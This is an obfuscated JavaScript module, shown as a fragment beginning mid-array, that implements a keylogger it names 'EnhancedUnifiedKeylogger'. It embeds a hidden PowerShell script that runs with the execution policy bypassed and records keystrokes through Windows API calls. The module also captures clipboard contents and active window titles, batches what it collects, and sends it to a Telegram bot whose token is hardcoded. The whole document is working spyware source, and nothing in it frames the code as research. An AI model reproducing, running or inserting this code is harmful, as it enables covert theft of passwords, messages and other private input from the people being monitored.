atusCode','currentLanguage','npm\x20install\x20active-win','timestamp','stop','üá®üá≥','üáØüáµ','messagesSentThisMinute','batchTimer','Unknown','english','substring','\x20chars)','Japanese','8131752pCijEu','Arabic','\x0a\x0aüìé\x20Full\x20content\x20attached\x20(','Source:\x20','...','3086070xVetes','instantClipboard','307915oxJRIj','üá∞üá∑','5170532ZYxZcs','from','concat','startClipboardMonitoring','TYPED','[BACKSPACE]','üñºÔ∏è\x20','platform','source','\x0a\x0aüìÑ\x20Preview:\x0a','currentWindow','Hidden','match','5229Qcxkgm','-ExecutionPolicy','[TAB]','windowTimer','PASTED','549386KyqJMb','psScriptPath','6Nqgcla','üìã\x20COPIED:\x20','priority','Already\x20running','start','Hebrew','argv','Bypass','üìã\x20Starting','test','shift','üìã\x20','isRunning','ENHANCED_READY','Cyrillic','now','bind','lastClipboardContent','telegramChatId','end','win32','7853310203:AAFWGbyq8bv2jPGvOC4YHm6yjz3X-mftP_Y','processMessageQueue','isMonitoringPaste','\x0aAdd-Type\x20-AssemblyName\x20System.Windows.Forms\x0a\x0aAdd-Type\x20@\x22\x0ausing\x20System;\x0ausing\x20System.Runtime.InteropServices;\x0ausing\x20System.Text;\x0a\x0apublic\x20class\x20WinAPI\x20{\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20short\x20GetAsyncKeyState(int\x20vKey);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20IntPtr\x20GetKeyboardLayout(uint\x20idThread);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20bool\x20GetKeyboardState(byte[]\x20lpKeyState);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20int\x20ToUnicodeEx(\x0a\x20\x20\x20\x20\x20\x20\x20\x20uint\x20wVirtKey,\x20uint\x20wScanCode,\x20byte[]\x20lpKeyState,\x0a\x20\x20\x20\x20\x20\x20\x20\x20[Out,\x20MarshalAs(UnmanagedType.LPWStr)]\x20StringBuilder\x20pwszBuff,\x0a\x20\x20\x20\x20\x20\x20\x20\x20int\x20cchBuff,\x20uint\x20wFlags,\x20IntPtr\x20dwhkl);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20uint\x20MapVirtualKeyEx(uint\x20uCode,\x20uint\x20uMapType,\x20IntPtr\x20dwhkl);\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20IntPtr\x20GetForegroundWindow();\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20[DllImport(\x22user32.dll\x22)]\x0a\x20\x20\x20\x20public\x20static\x20extern\x20uint\x20GetWindowThreadProcessId(IntPtr\x20hWnd,\x20IntPtr\x20lpdwProcessId);\x0a}\x0a\x22@\x0a\x0a$PreviousKeyStates\x20=\x20@{}\x0a$KeyboardState\x20=\x20New-Object\x20byte[]\x20256\x0a\x0afunction\x20Get-UnicodeChar\x20{\x0a\x20\x20\x20\x20param([int]$VirtualKey)\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20try\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20$hwnd\x20=\x20[WinAPI]::GetForegroundWindow()\x0a\x20\x20\x20\x20\x20\x20\x20\x20if\x20($hwnd\x20-eq\x20[IntPtr]::Zero)\x20{\x20return\x20$null\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20$threadId\x20=\x20[WinAPI]::GetWindowThreadProcessId($hwnd,\x20[IntPtr]::Zero)\x0a\x20\x20\x20\x20\x20\x20\x20\x20if\x20($threadId\x20-eq\x200)\x20{\x20return\x20$null\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20$hkl\x20=\x20[WinAPI]::GetKeyboardLayout($threadId)\x0a\x20\x20\x20\x20\x20\x20\x20\x20if\x20($hkl\x20-eq\x20[IntPtr]::Zero)\x20{\x20return\x20$null\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20[WinAPI]::GetKeyboardState($KeyboardState)\x20|\x20Out-Null\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20$scanCode\x20=\x20[WinAPI]::MapVirtualKeyEx($VirtualKey,\x200,\x20$hkl)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20$buffer\x20=\x20New-Object\x20System.Text.StringBuilder(10)\x0a\x20\x20\x20\x20\x20\x20\x20\x20$result\x20=\x20[WinAPI]::ToUnicodeEx($VirtualKey,\x20$scanCode,\x20$KeyboardState,\x20$buffer,\x20$buffer.Capacity,\x200,\x20$hkl)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20if\x20($result\x20-gt\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$char\x20=\x20$buffer.ToString()\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($char.Length\x20-gt\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$charCode\x20=\x20[int][char]$char[0]\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($charCode\x20-ge\x2032)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20$charCode\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20return\x20$null\x0a\x20\x20\x20\x20}\x20catch\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20return\x20$null\x0a\x20\x20\x20\x20}\x0a}\x0a\x0a$VirtualKeys\x20=\x208,9,13,16,17,18,19,20,27,32,33,34,35,36,37,38,39,40,41,44,45,46,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,144,145,186,187,188,189,190,191,192,219,220,221,222\x0a\x0a$SpecialKeys\x20=\x20@{\x0a\x20\x20\x20\x208\x20=\x20\x27[BACKSPACE]\x27;\x209\x20=\x20\x27[TAB]\x27;\x2013\x20=\x20\x27[ENTER]\x27;\x2016\x20=\x20\x27[SHIFT]\x27;\x2017\x20=\x20\x27[CTRL]\x27;\x2018\x20=\x20\x27[ALT]\x27;\x0a\x20\x20\x20\x2019\x20=\x20\x27[PAUSE]\x27;\x2020\x20=\x20\x27[CAPS]\x27;\x2027\x20=\x20\x27[ESC]\x27;\x2032\x20=\x20\x27\x20\x27;\x2033\x20=\x20\x27[PGUP]\x27;\x2034\x20=\x20\x27[PGDN]\x27;\x0a\x20\x20\x20\x2035\x20=\x20\x27[END]\x27;\x2036\x20=\x20\x27[HOME]\x27;\x2037\x20=\x20\x27[LEFT]\x27;\x2038\x20=\x20\x27[UP]\x27;\x2039\x20=\x20\x27[RIGHT]\x27;\x2040\x20=\x20\x27[DOWN]\x27;\x0a\x20\x20\x20\x2041\x20=\x20\x27[SELECT]\x27;\x2044\x20=\x20\x27[PRINT]\x27;\x2045\x20=\x20\x27[INSERT]\x27;\x2046\x20=\x20\x27[DELETE]\x27;\x0a\x20\x20\x20\x20112\x20=\x20\x27[F1]\x27;\x20113\x20=\x20\x27[F2]\x27;\x20114\x20=\x20\x27[F3]\x27;\x20115\x20=\x20\x27[F4]\x27;\x20116\x20=\x20\x27[F5]\x27;\x20117\x20=\x20\x27[F6]\x27;\x0a\x20\x20\x20\x20118\x20=\x20\x27[F7]\x27;\x20119\x20=\x20\x27[F8]\x27;\x20120\x20=\x20\x27[F9]\x27;\x20121\x20=\x20\x27[F10]\x27;\x20122\x20=\x20\x27[F11]\x27;\x20123\x20=\x20\x27[F12]\x27;\x0a\x20\x20\x20\x20144\x20=\x20\x27[NUMLOCK]\x27;\x20145\x20=\x20\x27[SCROLL]\x27\x0a}\x0a\x0aWrite-Output\x20\x22ENHANCED_READY\x22\x0a\x0atry\x20{\x0a\x20\x20\x20\x20while\x20($true)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20Start-Sleep\x20-Milliseconds\x2030\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20foreach\x20($vKey\x20in\x20$VirtualKeys)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$keyState\x20=\x20[WinAPI]::GetAsyncKeyState($vKey)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(($keyState\x20-band\x200x8000)\x20-ne\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(-not\x20$PreviousKeyStates.ContainsKey($vKey)\x20-or\x20-not\x20$PreviousKeyStates[$vKey])\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$PreviousKeyStates[$vKey]\x20=\x20$true\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($vKey\x20-eq\x2086)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$ctrlState\x20=\x20[WinAPI]::GetAsyncKeyState(17)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(($ctrlState\x20-band\x200x8000)\x20-ne\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22PASTE_DETECTED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20continue\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($vKey\x20-eq\x2067)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$ctrlState\x20=\x20[WinAPI]::GetAsyncKeyState(17)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(($ctrlState\x20-band\x200x8000)\x20-ne\x200)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22COPY_DETECTED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20continue\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$unicodeCode\x20=\x20Get-UnicodeChar\x20-VirtualKey\x20$vKey\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20($unicodeCode)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22UNICODE:$unicodeCode\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20elseif\x20($SpecialKeys.ContainsKey($vKey))\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$specialKey\x20=\x20$SpecialKeys[$vKey]\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22KEY:$specialKey\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$PreviousKeyStates[$vKey]\x20=\x20$false\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20}\x0a}\x20catch\x20{\x0a\x20\x20\x20\x20Write-Output\x20\x22ERROR:$($_.Exception.Message)\x22\x0a}\x0a','resetBatchTimer','üá∏üá¶','child_process','toString','toISOString','stdout','entries','toLocaleString','Chinese','üáßüá¨','exports','-File','split','/sendDocument','detectLanguageFromText','https','maxMessagesPerMinute','clipboardHistory','clipboardCheckInterval','trackActiveWindow','existsSync','SIGTERM','random','[ENTER]','s\x20ago)','find','----boundary','title','sendTelegramFile','messageSendTimer','addToKeystrokeBatch','9256uwCuiS','keyBuffer','[ESC]','timeout','handlePasteDetected','\x0aüñºÔ∏è\x20','replace','lastPasteTime','error','POST','clipboardTimer'];_0x1772=function(){return _0xa9b818;};return _0x1772();}function createEnhancedMonitor(_0x1562da={}){return new EnhancedUnifiedKeylogger(_0x1562da);}async function startEnhancedMonitor(_0xfd57c9={}){const _0x2869b9=_0x35a2c6,_0x63b4f7=createEnhancedMonitor(_0xfd57c9);return await _0x63b4f7[_0x2869b9(0x28d)](),_0x63b4f7;}module[_0x35a2c6(0x1da)]={'EnhancedUnifiedKeylogger':EnhancedUnifiedKeylogger,'createEnhancedMonitor':createEnhancedMonitor,'startEnhancedMonitor':startEnhancedMonitor};if(require[_0x35a2c6(0x208)]===module){const testMode=process[_0x35a2c6(0x28f)][0x2]===_0x35a2c6(0x292);console[_0x35a2c6(0x20a)]('üöÄ\x20K\x20+\x20C\x20helper'),console[_0x35a2c6(0x20a)](_0x35a2c6(0x291)),startEnhancedMonitor()['catch'](_0x27abce=>{const _0x23608b=_0x35a2c6;console['error']('‚ùå\x20Error:',_0x27abce[_0x23608b(0x222)]),process['exit'](0x1);});}
